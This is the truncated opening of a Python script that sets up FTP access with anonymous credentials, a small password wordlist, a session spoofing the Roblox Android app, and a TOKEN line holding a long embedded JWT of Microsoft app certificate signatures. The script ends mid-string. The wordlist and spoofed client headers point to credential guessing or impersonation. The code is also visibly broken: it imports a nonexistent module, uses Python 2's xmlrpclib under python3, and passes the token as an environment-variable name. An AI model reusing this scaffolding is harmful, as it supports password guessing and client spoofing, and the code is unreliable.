#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os
import sys
import time
import socket
import random
import requests
import re
import pyttsx3
import threading
import ftplib
import remote
import xmlrpclib as alpha_remote
from bs4 import BeautifulSoup
from urllib import request, parse
from tqdm.auto import tqdm
from termcolor import colored
from colorama import Fore, Style, init
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
import ssl

init()

FALAR = True
if 'com.termux' in os.environ.get('PREFIX', '') or 'ANDROID_ROOT' in os.environ:
    FALAR = False

try:
    if FALAR:
        engine = pyttsx3.init(driverName='espeak')
except Exception:
    FALAR = False

FTP_HOST = "ftp.osuosl.org"
FTP_USER = "anonymous"
FTP_PASS = "ashley"

QUOTES = ["Nunca desista!", "Você é incrível!", "Continue tentando!", "A vitória é sua!"]

wordlist = ["admin", "256281040558", "ftp", "0563137", "anonymous", "ashley"]

HEADERS = {
    'User-Agent': 'Mozilla/5.0 (2822MB; 720x1411; 320x319; 411x806; Samsung SM-A115F; 10) AppleWebKit/537.36 (KHTML, like Gecko)  ROBLOX Android App 2.448.411159 Phone Hybrid()  GooglePlayStore RobloxApp/2.448.411159 (GlobalDist; GooglePlayStore)'
}

roblox_session = requests.Session()
roblox_session.headers.update(HEADERS)

TOKEN = os.getenv("eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.ew0KICAiY2VydGlmaWNhdGVDaGFpbnMiOiBbDQogICAgew0KICAgICAgIm5hbWUiOiAic2t5ZHJpdmUiLA0KICAgICAgInNpZ25hdHVyZXMiOiBbDQogICAgICAgICJhMDo3OTo0MjoxNToyNzo4YTo1Njo3ZTo4ODo3YTpmNjpjZDplMDoxNTphNTplODo4NDoxNDplZjo2NDowZjo3ZDphYjozODo1NTphMzplNzo3OTo2NTo4YjplNzo3OCINCiAgICAgIF0NCiAgICB9LA0KICAgIHsNCiAgICAgICJuYW1lIjogInNreWRyaXZlX2NlcnRpZmljYXRlX2NoYWluIiwNCiAgICAgICJzaWduYXR1cmVzIjogWw0KICAgICAgICAiYTA6Nzk6NDI6MTU6Mjc6OGE6NTY6N2U6ODg6N2E6ZjY6Y2Q6ZTA6MTU6YTU6ZTg6ODQ6MTQ6ZWY6NjQ6MGY6N2Q6YWI6Mzg6NTU6YTM6ZTc6Nzk6NjU6OGI6ZTc6NzgiLA0KICAgICAgICAiYjE6N2U6ODI6MDE6YjE6Mjg6ZTE6ZTc6NGM6YzA6MjM6NTE6MGE6Yjc6ZWE6MDM6YWM6Mjc6ZGQ6ZTU6MGQ6MzI6ZDg6MTA6ZWE6MTU6Nzc6NzU6OGY6MWM6YzA6OTgiLA0KICAgICAgICAiMjg6NDg6MzY6MWE6OWM6MWU6MzI6ZGY6MWQ6M2U6MmU6ZDY6YTc6Yjk6ZTY6N2E6NTI6NWM6Zjg6YTE6M2I6MTY6NGY6ODA6MDY6Yzk6NDc6OTU6Nzg6Zjc6NDY6ZGUiDQogICAgICBdDQogICAgfSwNCiAgICB7DQogICAgICAibmFtZSI6ICJleGNlbF93b3JkX3Bvd2VycG9pbnRfb3V0bG9va19seW5jX2RlZmVuZGVyIiwNCiAgICAgICJzaWduYXR1cmVzIjogWw0KICAgICAgICAiYjk6MjU6MTM6NmY6M2U6YTc6YzA6YTE6OTU6MTY6OTA6YTE6YWI6MzE6Mzk6MTA6ZGE6ODE6ZjQ6MDk6OTQ6YTg6NTM6NDI6ZWM6NjI6Mjg6ODg6ZjE6Mjg6NzA6NTEiDQogICAgICBdDQogICAgfSwNCgl7DQogICAgICAibmFtZSI6ICJleGNlbF93b3JkX3Bvd2VycG9pbnRfb2ZmaWNlaHVicm93X2NoYWluIiwNCiAgICAgICJzaWduYXR1cmVzIjogWw0KICAgICAgICAgIjFmOmI0OmRlOjc2OjBmOjQwOmYzOjBlOjY2OmQzOjA4OjUxOjhhOjFiOmQ5OmQxOjRlOmYxOjQxOjFiOmZmOmE5OmQ2Ojc2OjI4Ojc2OmI2OjAyOjY2OjFkOjU0OmVkIiwNCiAgICAgICAgICI0Yjo4ZjozNDpjOTo3ZTowNTphZTpjZTpiNzo0YzpiNTpjOTo4ZjozNjpmNjoyODo2ZjpkODpiZjo2NDphMjo1NzphYzozYjozMjo1MDoxODpkMDpkZDowOTpjMDo3OSIsDQogICAgICAgICAiNjA6MWE6OTc6MGY6M2Y6MmY6NWU6MjU6NjQ6NjQ6ZjE6NDI6NGY6ZTc6MGQ6Zjg6ODM6NWE6M2E6NGM6YTQ6NDE6YTc6ZjI6ZTg6MDQ6ZTQ6YmU6Njg6MDU6OGQ6OGMiDQogICAgICBdDQogICAgfSwNCiAgICB7DQogICAgICAibmFtZSI6ICJza3lwZSIsDQogICAgICAic2lnbmF0dXJlcyI6IFsNCiAgICAgICAgIjdkOjUzOjkzOjUxOmNhOjM5OmMyOjdjOmE3OjA2OjQwOjllOjVhOjliOjZiOjA2OjJkOmI5OmJmOjhkOmMzOmQ4OmNhOmE2OjEzOjcwOjY3OmFlOjdmOjY4OmI1OmU3IiwNCiAgICAgICAgIjZlOmQ1OmEzOjI5OjM1Ojg0OjQ4OjFjOmVhOjVhOjBiOjE3OjRmOmE0OjZhOjg1OmIwOjM5OmI1OmIzOjk4OjkyOjlhOjI2OjRiOjYyOjM0OjI3OmIyOjM3OmQ1OmUzIg0KICAgICAgXQ0KICAgIH0sDQogICAgew0KICAgICAgIm5hbWUiOiAid3VuZGVybGlzdCIsDQogICAgICAic2lnbmF0dXJlcyI6IFsNCiAgICAgICAgImI1OmIxOmU0OjZkOjVkOjBkOmJmOjk2Ojg4OjMwOjk4OjdlOjkyOjAzOjUwOmNjOmVhOmQ4OjI3OjM2OjA1OjEyOmIzOjFmOmNiOjk4OjdhOjk5OjU5OmExOjVhOjg1Ig0KICAgICAgXQ0KICAgIH0sDQogICAgew0KICAgICAgIm5hbWUiOiAic2hpZnRyX2RmIiwNCiAgICAgICJzaWduYXR1cmVzIjogWw0KICAgICAgICAiZjc6YzE6YTc6MDI6ZWE6Mzc6N2M6YjY6ZjM6MzY6NzY6ZjQ6ZTM6Y2Q6YTY6ZDk6MmQ6NjI6OGM6OTE6ZTg6YTU6NDg6Mjk6MTM6NGQ6OTI6ODY6MTI6Yjc6NGE6MDYiDQogICAgICBdDQogICAgfSwNCiAgICB7DQogICAgICAibmFtZSI6ICJjb3J0YW5hIiwNCiAgICAgICJzaWduYXR1cmVzIjogWw0KICAgICAgICAiODM6NjY6ZmE6Zjc6Mjc6ZGM6NDg6MzE6N2E6MmY6M2E6MGM6Mzc6ZmE6MTI6N2Y6M2Y6MzU6NjE6OTQ6Y2Y6YmI6MmY6NGI6NjI6OGU6Yzc6ZTY6YTE6YTc6NWM6MGYiDQogICAgICBdDQogICAgfSwNCiAgICB7DQogICAgICAibmFtZSI6ICJjb3J0YW5hX2NoYWluIiwNCiAgICAgICJzaWduYXR1cmVzIjogWw0KICAgICAgICAiODM6NjY6ZmE6Zjc6Mjc6ZGM6NDg6MzE6N2E6MmY6M2E6MGM6Mzc6ZmE6MTI6N2Y6M2Y6MzU6NjE6OTQ6Y2Y6YmI6MmY6NGI6NjI6OGU6Yzc6ZTY6YTE6YTc6NWM6MGYiLA0KICAgICAgICAiYjE6N2U6ODI6MDE6YjE6Mjg6ZTE6ZTc6NGM6YzA6MjM6NTE6MGE6Yjc6ZWE6MDM6YWM6Mjc6ZGQ6ZTU6MGQ6MzI6ZDg6MTA6ZWE6MTU6Nzc6NzU6OGY6MWM6YzA6OTgiLA0KICAgICAgICAiMjg6NDg6MzY6MWE6OWM6MWU6MzI6ZGY6MWQ6M2U6MmU6ZDY6YTc6Yjk6ZTY6N2E6NTI6NWM6Zjg6YTE6M2I6MTY6NGY6ODA6MDY6Yzk6NDc6OTU6Nzg6Zjc6NDY6ZGUiDQogICAgICBdDQogICAgfSwNCiAgICB7DQogICAgICAibmFtZSI6ICJsYXVuY2hlciIsDQogICAgICAic2lnbmF0dXJlcyI6IFsNCiAgICAgICAgImU4OjQzOmVlOjNkOmExOjE5OjVkOjZhOmZiOjg5OmNhOmEzOmNlOjc0OjI3OmIwOjhmOmMwOjFmOmQ4Ojc4OmEyOjRmOmE1OjZlOjk2OjJjOjM1OmM3OjFkOjVlOjcwIg0KICAgICAgXQ0KICAgIH0sDQogICAgew0KICAgICAgIm5hbWUiOiAibGF1bmNoZXJfY2hhaW4iLA0KICAgICAgInNpZ25hdHVyZXMiOiBbDQogICAgICAgICJlODo0MzplZTozZDphMToxOTo1ZDo2YTpmYjo4OTpjYTphMzpjZTo3NDoyNzpiMDo4ZjpjMDoxZjpkODo3ODphMjo0ZjphNTo2ZTo5NjoyYzozNTpjNzoxZDo1ZTo3MCIsDQogICAgICAgICJiMTo3ZTo4MjowMTpiMToyODplMTplNzo0YzpjMDoyMzo1MTowYTpiNzplYTowMzphYzoyNzpkZDplNTowZDozMjpkODoxMDplYToxNTo3Nzo3NTo4ZjoxYzpjMDo5OCIsDQogICAgICAgICIyODo0ODozNjoxYTo5YzoxZTozMjpkZjoxZDozZToyZTpkNjphNzpiOTplNjo3YTo1Mjo1YzpmODphMTozYjoxNjo0Zjo4MDowNjpjOTo0Nzo5NTo3ODpmNzo0NjpkZSINCiAgICAgIF0NCiAgICB9LA0KICAgIHsNCiAgICAgICJuYW1lIjogInBvd2VyYXBwIiwNCiAgICAgICJzaWduYXR1cmVzIjogWw0KICAgICAgICAiM2Q6MDA6MGQ6OGE6MWU6MjE6NTA6ZGI6Mjg6NWY6OWM6YTg6NmI6OTA6YWQ6NjQ6ODc6ODQ6MGI6YjE6MDQ6OGM6ZDk6Zjc6YjM6NzA6NjY6NTY6MmQ6ZjU6ZWQ6NmMiDQogICAgICBdDQogICAgfSwNCiAgICB7DQogICAgICAibmFtZSI6ICJiaW5nIiwNCiAgICAgICJzaWduYXR1cmVzIjogWw0KICAgICAgICAiYWM6NDY6YWI6YTk6MjM6NmU6YmQ6NWE6ZWQ6MzU6OTk6NGU6OWU6ODg6ZWU6NzU6ZDE6ZDY6YjU6MTA6ZTE6ZDU6ZjE6NDE6Yjc6MTk6ZGE6NjI6ZGM6MzU6ODY6ZmEiDQogICAgICBdDQogICAgfSwNCiAgICB7DQogICAgICAibmFtZSI6ICJiaW5nX2NoYWluIiwNCiAgICAgICJzaWduYXR1cmVzIjogWw0KICAgICAgICAiYWM6NDY6YWI6YTk6MjM6NmU6YmQ6NWE6ZWQ6MzU6OTk6NGU6OWU6ODg6ZWU6NzU6ZDE6ZDY6YjU6MTA6ZTE6ZDU6ZjE6NDE6Yjc6MTk6ZGE6NjI6ZGM6MzU6ODY6ZmEiLA0KICAgICAgICAiYjE6N2U6ODI6MDE6YjE6Mjg6ZTE6ZTc6NGM6YzA6MjM6NTE6MGE6Yjc6ZWE6MDM6YWM6Mjc6ZGQ6ZTU6MGQ6MzI6ZDg6MTA6ZWE6MTU6Nzc6NzU6OGY6MWM6YzA6OTgiLA0KICAgICAgICAiMjg6NDg6MzY6MWE6OWM6MWU6MzI6ZGY6MWQ6M2U6MmU6ZDY6YTc6Yjk6ZTY6N2E6NTI6NWM6Zjg6YTE6M2I6MTY6NGY6ODA6MDY6Yzk6NDc6OTU6Nzg6Zjc6NDY6ZGUiDQogICAgICBdDQogICAgfSwNCiAgICB7DQogICAgICAibmFtZSI6ICJjaGVzaGlyZSIsDQogICAgICAic2lnbmF0dXJlcyI6IFsNCiAgICAgICAgIjVmOmE1OmU2OmJlOjA2OmQ2OmZiOjk4OjNmOjI2OjJlOmNlOjYxOjM0OmM1OjI2OjA4OjQ1OjBjOmIxOjFkOmMzOjA2OjEyOmY3OjgwOjU5OmQ4OmU3OjY5OmFjOmExIg0KICAgICAgXQ0KICAgIH0sDQogICAgew0KICAgICAgIm5hbWUiOiAiY2hlc2hpcmVfY2hhaW4iLA0KICAgICAgInNpZ25hdHVyZXMiOiBbDQogICAgICAgICI1ZjphNTplNjpiZTowNjpkNjpmYjo5ODozZjoyNjoyZTpjZTo2MTozNDpjNToyNjowODo0NTowYzpiMToxZDpjMzowNjoxMjpmNzo4MDo1OTpkODplNzo2OTphYzphMSIsDQogICAgICAgICJiMTo3ZTo4MjowMTpiMToyODplMTplNzo0YzpjMDoyMzo1MTowYTpiNzplYTowMzphYzoyNzpkZDplNTowZDozMjpkODoxMDplYToxNTo3Nzo3NTo4ZjoxYzpjMDo5OCIsDQogICAgICAgICIyODo0ODozNjoxYTo5YzoxZTozMjpkZjoxZDozZToyZTpkNjphNzpiOTplNjo3YTo1Mjo1YzpmODphMTozYjoxNjo0Zjo4MDowNjpjOTo0Nzo5NTo3ODpmNzo0NjpkZSINCiAgICAgIF0NCiAgICB9LA0KICAgIHsNCiAgICAgICJuYW1lIjogImJpbmdhcHBzIiwNCiAgICAgICJzaWduYXR1cmVzIjogWw0KICAgICAgICAiZGI6NjE6YWU6NDQ6NzM6M2U6ZDk6YTE6OTk6ZTU6Mzg6ZTc6YmM6MjM6MTI6YjE6Y2E6MDA6ZDA6ODM6ZDg6MTI6NzY6NWM6MTQ6Zjc6MTM6NjA6MmQ6ZTg6OTQ6YzIiDQogICAgICBdDQogICAgfSwNCiAgICB7DQogICAgICAibmFtZSI6ICJiaW5nYXBwc19jaGFpbiIsDQogICAgICAic2lnbmF0dXJlcyI6IFsNCiAgICAgICAgImRiOjYxOmFlOjQ0OjczOjNlOmQ5OmExOjk5OmU1OjM4OmU3OmJjOjIzOjEyOmIxOmNhOjAwOmQwOjgzOmQ4OjEyOjc2OjVjOjE0OmY3OjEzOjYwOjJkOmU4Ojk0OmMyIiwNCiAgICAgICAgImIxOjdlOjgyOjAxOmIxOjI4OmUxOmU3OjRjOmMwOjIzOjUxOjBhOmI3OmVhOjAzOmFjOjI3OmRkOmU1OjBkOjMyOmQ4OjEwOmVhOjE1Ojc3Ojc1OjhmOjFjOmMwOjk4IiwNCiAgICAgICAgIjI4OjQ4OjM2OjFhOjljOjFlOjMyOmRmOjFkOjNlOjJlOmQ2OmE3OmI5OmU2OjdhOjUyOjVjOmY4OmExOjNiOjE2OjRmOjgwOjA2OmM5OjQ3Ojk1Ojc4OmY3OjQ2OmRlIg0KICAgICAgXQ0KICAgIH0sDQogICAgew0KICAgICAgIm5hbWUiOiAieWFtbWVyIiwNCiAgICAgICJzaWduYXR1cmVzIjogWw0KICAgICAgICAiNTI6NTY6ZmU6YjQ6Zjc6YzU6YWE6Njg6NjE6OWI6OGE6ZjU6NmY6OTg6Njk6MWQ6NTY6OGU6YzA6NDQ6MzU6MDg6YjU6YWI6OGE6MDE6NDg6OTQ6MmU6ZmI6ZTI6MGEiDQogICAgICBdDQogICAgfSwNCiAgICB7DQogICAgICAibmFtZSI6ICJ5YW1tZXJfY2hhaW4iLA0KICAgICAgInNpZ25hdHVyZXMiOiBbDQogICAgICAgICI1Mjo1NjpmZTpiNDpmNzpjNTphYTo2ODo2MTo5Yjo4YTpmNTo2Zjo5ODo2OToxZDo1Njo4ZTpjMDo0NDozNTowODpiNTphYjo4YTowMTo0ODo5NDoyZTpmYjplMjowYSIsDQogICAgICAgICJiMTo3ZTo4MjowMTpiMToyODplMTplNzo0YzpjMDoyMzo1MTowYTpiNzplYTowMzphYzoyNzpkZDplNTowZDozMjpkODoxMDplYToxNTo3Nzo3NTo4ZjoxYzpjMDo5OCIsDQogICAgICAgICIyODo0ODozNjoxYTo5YzoxZTozMjpkZjoxZDozZToyZTpkNjphNzpiOTplNjo3YTo1Mjo1YzpmODphMTozYjoxNjo0Zjo4MDowNjpjOTo0Nzo5NTo3ODpmNzo0NjpkZSINCiAgICAgIF0NCiAgICB9LA0KICAgIHsNCiAgICAgICJuYW1lIjogImNvbm5lY3Rpb25zIiwNCiAgICAgICJzaWduYXR1cmVzIjogWw0KICAgICAgICAiN2I6ZjI6ODU6YWY6YjU6NDM6N2Q6YmI6OTA6ZTA6MTQ6Yjg6ZGQ6ZDQ6Nzc6MGQ6ZTA6Yzc6NGE6NDA6ODM6MmY6M2E6ZTA6NmU6NGE6MGM6NGQ6NDA6NTM6ODI6MzMiDQogICAgICBdDQogICAgfSwNCiAgICB7DQogICAgICAibmFtZSI6ICJjb25uZWN0aW9uc19jaGFpbiIsDQogICAgICAic2lnbmF0dXJlcyI6IFsNCiAgICAgICAgIjdiOmYyOjg1OmFmOmI1OjQzOjdkOmJiOjkwOmUwOjE0OmI4OmRkOmQ0Ojc3OjBkOmUwOmM3OjRhOjQwOjgzOjJmOjNhOmUwOjZlOjRhOjBjOjRkOjQwOjUzOjgyOjMzIiwNCiAgICAgICAgImIxOjdlOjgyOjAxOmIxOjI4OmUxOmU3OjRjOmMwOjIzOjUxOjBhOmI3OmVhOjAzOmFjOjI3OmRkOmU1OjBkOjMyOmQ4OjEwOmVhOjE1Ojc3Ojc1OjhmOjFjOmMwOjk4IiwNCiAgICAgICAgIjI4OjQ4OjM2OjFhOjljOjFlOjMyOmRmOjFkOjNlOjJlOmQ2OmE3OmI5OmU2OjdhOjUyOjVjOmY4OmExOjNiOjE2OjRmOjgwOjA2OmM5OjQ3Ojk1Ojc4OmY3OjQ2OmRlIg0KICAgICAgXQ0KICAgIH0sDQogICAgew0KICAgICAgIm5hbWUiOiAicnVieSIsDQogICAgICAic2lnbmF0dXJlcyI6IFsNCiAgICAgICAgImMxOjA0OjljOjk5OjMyOjcwOjQ4OmE2OjMwOmVhOjA5OmFjOmZmOjM2OmY5OjE0OmFlOmEyOmQwOjRmOjA5OjM0OjRiOjM1OjRlOmEyOmQyOmRiOmE5OmRmOmExOmViIg0KICAgICAgXQ0KICAgIH0sDQogICAgew0KICAgICAgIm5hbWUiOiAibW14IiwNCiAgICAgICJzaWduYXR1cmVzIjogWw0KICAgICAgICAiMmQ6ZGU6Yzk6NDI6YjY6OGU6NGM6N2M6YTU6NGE6NWU6MzY6Nzg6ODA6ZWY6NGQ6YTU6OTU6NDg6MTc6MzA6YTA6NTI6MzQ6NjI6MTI6YWM6YzM6OTg6NWM6YWE6YWYiDQogICAgICBdDQogICAgfSwNCiAgICB7DQogICAgICAibmFtZSI6ICJtbXgyIiwNCiAgICAgICJzaWduYXR1cmVzIjogWw0KICAgICAgICAiMDE6ZTE6OTk6OTc6MTA6YTg6MmM6Mjc6NDk6YjQ6ZDU6MGM6NDQ6NWQ6Yzg6NWQ6Njc6MGI6NjE6MzY6MDg6OWQ6MGE6NzY6NmE6NzM6ODI6N2M6ODI6YTE6ZWE6YzkiDQogICAgICBdDQogICAgfSwNCiAgICB7DQogICAgICAibmFtZSI6ICJtbXgyX2NoYWluIiwNCiAgICAgICJzaWduYXR1cmVzIjogWw0KICAgICAgICAiMDE6ZTE6OTk6OTc6MTA6YTg6MmM6Mjc6NDk6YjQ6ZDU6MGM6NDQ6NWQ6Yzg6NWQ6Njc6MGI6NjE6MzY6MDg6OWQ6MGE6NzY6NmE6NzM6ODI6N2M6ODI6YTE6ZWE6YzkiLA0KICAgICAgICAiYjE6N2U6ODI6MDE6YjE6Mjg6ZTE6ZTc6NGM6YzA6MjM6NTE6MGE6Yjc6ZWE6MDM6YWM6Mjc6ZGQ6ZTU6MGQ6MzI6ZDg6MTA6ZWE6MTU6Nzc6NzU6OGY6MWM6YzA6OTgiLA0KICAgICAgICAiMjg6NDg6MzY6MWE6OWM6MWU6MzI6ZGY6MWQ6M2U6MmU6ZDY6YTc6Yjk6ZTY6N2E6NTI6NWM6Zjg6YTE6M2I6MTY6NGY6ODA6MDY6Yzk6NDc6OTU6Nzg6Zjc6NDY6ZGUiDQogICAgICBdDQogICAgfSwNCiAgICB7DQogICAgICAibmFtZSI6ICJlZGdlX2xvY2FsX2FuZF9yb2xsaW5nIiwNCiAgICAgICJzaWduYXR1cmVzIjogWw0KICAgICAgICAiMzI6YTI6ZmM6NzQ6ZDc6MzE6MTA6NTg6NTk6ZTU6YTg6NWQ6ZjE6NmQ6OTU6ZjE6MDI6ZDg6NWI6MjI6MDk6OWI6ODA6NjQ6YzU6ZDg6OTE6NWM6NjE6ZGE6ZDE6ZTAiDQogICAgICBdDQogICAgfSwNCiAgICB7DQogICAgICAibmFtZSI6ICJmbG93IiwNCiAgICAgICJzaWduYXR1cmVzIjogWw0KICAgICAgICAiZTM6Mzk6NWQ6Zjg6NTc6ZGI6NGI6OTQ6ZjQ6OGE6Nzk6NWU6MjI6ZGI6MWY6MDg6YTY6YmU6ZDQ6OTA6OWE6NDU6ZTQ6ZWQ6YzE6ODc6MTg6ZTg6YWE6MTc6YjY6ZmIiDQogICAgICBdDQogICAgfSwNCiAgICB7DQogICAgICAibmFtZSI6ICJzd2lmdGtleSIsDQogICAgICAic2lnbmF0dXJlcyI6IFsNCiAgICAgICAgIjBhOmQwOjA4OjhkOmZiOjM0OjdhOjhhOjUxOjVmOjJkOjEzOmIxOjdhOjU2OjFkOjVjOjNmOjk3OjczOjQzOjhhOjIwOjcyOjQxOmJhOmU3OjQ4OjNjOjk5OmI3OjZmIg0KICAgICAgXQ0KICAgIH0sDQogICAgew0KICAgICAgIm5hbWUiOiAia2FpemFsYSIsDQogICAgICAic2lnbmF0dXJlcyI6IFsNCiAgICAgICAgIjNjOjQwOjQ5OmNkOmNiOmYxOjk4OmE2OmRkOjRjOjViOjk1OjY5OjYzOmUzOjZjOjQ4OmM4OjA3OmIzOmMyOjllOjJlOjJjOjYxOmQ0OjQ1OjEzOmY0OmMxOmU4OjQwIg0KICAgICAgXQ0KICAgIH0sDQogICAgew0KICAgICAgIm5hbWUiOiAiaW52b2ljZSIsDQogICAgICAic2lnbmF0dXJlcyI6IFsNCiAgICAgICAgIjhhOjA5OmM1OjFiOjNmOjgwOjBmOmJjOjI2OmI1OjJkOmI2OjJjOjk5OmNjOjhjOjJlOjA0OmUxOmFkOjRhOjkyOjE5OmJjOmEzOjJiOjgxOjIwOmM4OmU1OjZjOmNkIg0KICAgICAgXQ0KICAgIH0sDQogICAgew0KICAgICAgIm5hbWUiOiAiaW52b2ljZV9jaGFpbiIsDQogICAgICAic2lnbmF0dXJlcyI6IFsNCiAgICAgICAgIjhhOjA5OmM1OjFiOjNmOjgwOjBmOmJjOjI2OmI1OjJkOmI2OjJjOjk5OmNjOjhjOjJlOjA0OmUxOmFkOjRhOjkyOjE5OmJjOmEzOjJiOjgxOjIwOmM4OmU1OjZjOmNkIiwNCiAgICAgICAgImIxOjdlOjgyOjAxOmIxOjI4OmUxOmU3OjRjOmMwOjIzOjUxOjBhOmI3OmVhOjAzOmFjOjI3OmRkOmU1OjBkOjMyOmQ4OjEwOmVhOjE1Ojc3Ojc1OjhmOjFjOmMwOjk4IiwNCiAgICAgICAgIjI4OjQ4OjM2OjFhOjljOjFlOjMyOmRmOjFkOjNlOjJlOmQ2OmE3OmI5OmU2OjdhOjUyOjVjOmY4OmExOjNiOjE2OjRmOjgwOjA2OmM5OjQ3Ojk1Ojc4OmY3OjQ2OmRlIg0KICAgICAgXQ0KICAgIH0sDQogICAgew0KICAgICAgIm5hbWUiOiAib25lYXV0aF90ZXN0YXBwIiwNCiAgICAgICJzaWduYXR1cmVzIjogWw0KICAgICAgICAiYjk6MjU6MTM6NmY6M2U6YTc6YzA6YTE6OTU6MTY6OTA6YTE6YWI6MzE6Mzk6MTA6ZGE6ODE6ZjQ6MDk6OTQ6YTg6NTM6NDI6ZWM6NjI6Mjg6ODg6ZjE6Mjg6NzA6NTEiDQogICAgICBdDQogICAgfSwNCiAgICB7DQogICAgICAibmFtZSI6ICJzdXJmYWNlX2R1b19tc2Ffc2lnbl9pbl9zZWxmX2hvc3QiLA0KICAgICAgInNpZ25hdHVyZXMiOiBbDQogICAgICAgICJhNToyNjowMjowNTphYzpiNjo2YTphMDo4NzowZTozYTplMzo3MTpkMTo3ODozMTo3ODpiYzo3Zjo0NTo3ODpmMzo4YzowOTplNTo3MjoyZjpjZjpkNTo0Njo2NTpiZSINCiAgICAgIF0NCiAgICB9LA0KICAgIHsNCiAgICAgICJuYW1lIjogInN1cmZhY2VfZHVvX21zYV9zaWduX2luX3Byb2QiLA0KICAgICAgInNpZ25hdHVyZXMiOiBbDQogICAgICAgICI4YTo1NToxNTo0NzowMjphZTo2MjpkOTpkNDo3YjpiNDo0Zjo4Yzo2Yzo5NTowODoyOTpmNjpkODo2YToyMjoyYjpkYzpjYzo3YzpmMzo2ZDpjMjo5MjowNTphMzpiZiINCiAgICAgIF0NCiAgICB9LA0KICAgIHsNCiAgICAgICJuYW1lIjogImRlbHZlX2luX3Byb2QiLA0KICAgICAgInNpZ25hdHVyZXMiOiBbDQogICAgICAgICI0Mzo1ZDowMjplYjpiNzpkMjozMDpiYjo3YzoyNzphODo3Mjo1MzplYjozYTo3MzphYjo0Mjo0YTpkNjowMDo1NTo2MjpiYzpjYjoyYjo4NTowNjpjNjo4Zjo4NzpmNSINCiAgICAgIF0NCiAgICB9LA0KICAgIHsNCiAgICAgICJuYW1lIjogInN0cmVhbV9tb2JpbGVfcHJvZCIsDQogICAgICAic2lnbmF0dXJlcyI6IFsNCiAgICAgICAgIjg5OmFlOjAxOmY5OjY5OjBlOmY4OmMxOjI3OmFjOmI4OjlmOmI5OjZkOjc1OjBiOjliOmQzOjgyOmJhOjA1OjFjOmQ1OjI4OjcyOjY3OmUwOjAyOjc0OjNlOmIxOmQ3IiwNCiAgICAgICAgImIxOjdlOjgyOjAxOmIxOjI4OmUxOmU3OjRjOmMwOjIzOjUxOjBhOmI3OmVhOjAzOmFjOjI3OmRkOmU1OjBkOjMyOmQ4OjEwOmVhOjE1Ojc3Ojc1OjhmOjFjOmMwOjk4IiwNCiAgICAgICAgIjI4OjQ4OjM2OjFhOjljOjFlOjMyOmRmOjFkOjNlOjJlOmQ2OmE3OmI5OmU2OjdhOjUyOjVjOmY4OmExOjNiOjE2OjRmOjgwOjA2OmM5OjQ3Ojk1Ojc4OmY3OjQ2OmRlIg0KICAgICAgXQ0KICAgIH0sDQogICAgew0KICAgICAgIm5hbWUiOiAic3RyZWFtX21vYmlsZV9iZXRhIiwNCiAgICAgICJzaWduYXR1cmVzIjogWw0KICAgICAgICAiZTQ6MTU6MWU6Mzg6MmI6NTE6MDc6OGM6YWE6MmU6M2U6MGM6NzE6OWE6OTU6ZGY6MTc6NzI6ZTQ6Y2E6ZjE6OTQ6OTY6MjY6NDg6MzM6YWI6NjY6MWQ6ODY6MTI6NjUiDQogICAgICBdDQogICAgfSwNCiAgICB7DQogICAgICAibmFtZSI6ICJjbG91ZGNvbm5lY3RfcHJvZHVjdGlvbl9jaGFpbiIsDQogICAgICAic2lnbmF0dXJlcyI6IFsNCiAgICAgICAgIjhhOjU1OjE1OjQ3OjAyOmFlOjYyOmQ5OmQ0OjdiOmI0OjRmOjhjOjZjOjk1OjA4OjI5OmY2OmQ4OjZhOjIyOjJiOmRjOmNjOjdjOmYzOjZkOmMyOjkyOjA1OmEzOmJmIiwNCiAgICAgICAgImIxOjdlOjgyOjAxOmIxOjI4OmUxOmU3OjRjOmMwOjIzOjUxOjBhOmI3OmVhOjAzOmFjOjI3OmRkOmU1OjBkOjMyOmQ4OjEwOmVhOjE1Ojc3Ojc1OjhmOjFjOmMwOjk4IiwNCiAgICAgICAgIjI4OjQ4OjM2OjFhOjljOjFlOjMyOmRmOjFkOjNlOjJlOmQ2OmE3OmI5OmU2OjdhOjUyOjVjOmY4OmExOjNiOjE2OjRmOjgwOjA2OmM5OjQ3Ojk1Ojc4OmY3OjQ2OmRlIg0KICAgICAgXQ0KICAgIH0sDQogICAgew0KICAgICAgIm5hbWUiOiAibWljcm9zb2Z0X2xpc3RzIiwNCiAgICAgICJzaWduYXR1cmVzIjogWw0KICAgICAgICAiYTA6Nzk6NDI6MTU6Mjc6OGE6NTY6N2U6ODg6N2E6ZjY6Y2Q6ZTA6MTU6YTU6ZTg6ODQ6MTQ6ZWY6NjQ6MGY6N2Q6YWI6Mzg6NTU6YTM6ZTc6Nzk6NjU6OGI6ZTc6NzgiLA0KICAgICAgICAiYjE6N2U6ODI6MDE6YjE6Mjg6ZTE6ZTc6NGM6YzA6MjM6NTE6MGE6Yjc6ZWE6MDM6YWM6Mjc6ZGQ6ZTU6MGQ6MzI6ZDg6MTA6ZWE6MTU6Nzc6NzU6OGY6MWM6YzA6OTgiLA0KICAgICAgICAiMjg6NDg6MzY6MWE6OWM6MWU6MzI6ZGY6MWQ6M2U6MmU6ZDY6YTc6Yjk6ZTY6N2E6NTI6NWM6Zjg6YTE6M2I6MTY6NGY6ODA6MDY6Yzk6NDc6OTU6Nzg6Zjc6NDY6ZGUiDQogICAgICBdDQogICAgfQ0KICBdLA0KICAiYXBwbGljYXRpb25JZHMiOiBbDQogICAgImNvbS5taWNyb3NvZnQuc2t5ZHJpdmUiLA0KICAgICJjb20ubWljcm9zb2Z0Lm9mZmljZS53b3JkIiwNCiAgICAiY29tLm1pY3Jvc29mdC5vZmZpY2UuZXhjZWwiLA0KICAgICJjb20ubWljcm9zb2Z0Lm9mZmljZS5wb3dlcnBvaW50IiwNCiAgICAiY29tLm1pY3Jvc29mdC5vZmZpY2Uub2ZmaWNlaHViIiwNCiAgICAiY29tLm1pY3Jvc29mdC5vZmZpY2Uub2ZmaWNlaHVicm93IiwNCiAgICAiY29tLm1pY3Jvc29mdC5vZmZpY2Uub3V0bG9vayIsDQogICAgImNvbS5taWNyb3NvZnQub2ZmaWNlLm9uZW5vdGUiLA0KICAgICJjb20uc2t5cGUucmFpZGVyIiwNCiAgICAiY29tLnNreXBlLmluc2lkZXJzIiwNCiAgICAiY29tLm1pY3Jvc29mdC5za3lwZS5hbmRyb2lkLnM0bC5kZiIsDQogICAgImNvbS5za3lwZS5tMiIsDQogICAgImNvbS5taWNyb3NvZnQub2ZmaWNlLmx5bmMxNSIsDQogICAgIm9scy5taWNyb3NvZnQuY29tLnN